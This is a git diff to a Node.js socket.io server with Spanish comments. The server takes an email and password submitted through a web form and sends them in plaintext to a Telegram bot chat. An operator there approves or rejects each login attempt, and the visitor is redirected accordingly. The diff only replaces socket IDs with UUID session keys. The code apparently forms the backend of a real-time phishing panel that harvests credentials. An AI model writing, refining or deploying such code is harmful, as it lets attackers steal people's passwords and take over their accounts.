@@ -7,6 +7,7 @@ const { Server } = require('socket.io');
 const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
 const bodyParser = require('body-parser');
+const { v4: uuidv4 } = require('uuid'); // Generador de IDs únicos
 
 const server = http.createServer(app);
 const io = new Server(server, {
@@ -28,17 +29,17 @@ io.on('connection', (socket) => {
   console.log('🧠 Usuario conectado:', socket.id);
 
   socket.on('dataForm', ({ correo, contrasena }) => {
-    const mensaje = `🔐 Nuevo intento de acceso:\n\n📧 Correo: ${correo}\n🔑 Contraseña: ${contrasena}`;
+    const sessionId = uuidv4(); // Crear ID único para esta sesión
+    activeSockets.set(sessionId, socket); // Guardar el socket usando sessionId
 
-    // Guardamos el socket para después
-    activeSockets.set(socket.id, socket);
+    const mensaje = `🔐 Nuevo intento de acceso:\n\n📧 Correo: ${correo}\n🔑 Contraseña: ${contrasena}`;
 
     const botones = {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: '✅ Aceptar', callback_data: `aprobado_${socket.id}` },
-            { text: '❌ Rechazar', callback_data: `rechazado_${socket.id}` }
+            { text: '✅ Aceptar', callback_data: `aprobado_${sessionId}` },
+            { text: '❌ Rechazar', callback_data: `rechazado_${sessionId}` }
           ]
         ]
       }
@@ -53,8 +54,8 @@ bot.on('callback_query', (query) => {
   const chatId = query.message.chat.id;
 
   if (data.startsWith('aprobado_') || data.startsWith('rechazado_')) {
-    const socketId = data.split('_')[1];
-    const socket = activeSockets.get(socketId);
+    const sessionId = data.split('_')[1];
+    const socket = activeSockets.get(sessionId);
 
     if (socket) {
       const redireccion = data.startsWith('aprobado_') ? '/index.html' : '/rechazado.html';
@@ -65,7 +66,7 @@ bot.on('callback_query', (query) => {
         : '🔴 Acceso denegado.';
 
       bot.sendMessage(chatId, respuesta);
-      activeSockets.delete(socketId);
+      activeSockets.delete(sessionId);
     } else {
       bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
     }
